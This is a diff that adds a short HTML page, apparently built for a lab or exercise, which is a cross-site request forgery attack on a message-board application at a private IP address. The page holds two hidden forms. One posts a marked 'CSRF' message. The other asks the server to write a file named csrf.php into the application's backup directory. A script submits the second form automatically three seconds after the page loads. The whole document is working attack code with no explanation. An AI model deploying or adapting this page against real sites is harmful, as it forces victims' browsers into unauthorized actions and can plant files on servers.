@@ -1,0 +1,27 @@
+<html>
+
+<head>
+  <meta charset="utf-8">
+</head>
+
+<body>
+  <form action="http://10.210.145.28/yarare/" method="POST" id="form1">
+    <input type="hidden" name="content" value="###////CSRF!!!////###">
+    <input type="hidden" name="newpost_submit" value="xxx">
+  </form>
+  <form action="http://10.210.145.28/yarare/" method="POST" id="form2">
+    <input type="hidden" name="upfile_name" value="csrf.php">
+    <input type="hidden" name="backup_path" value="/home/yarare-board/yarare-board/server/yarare/backupfile/csrf.php">
+    <input type="hidden" name="newpost_submit" value="yyy">
+  </form>
+  <script>
+    var form2 = document.getElementById("form2");
+    const sub = () => { form2.submit(); }
+    setTimeout(sub, 3000);
+  </script>
+  <script>
+
+  </script>
+</body>
+
+</html>
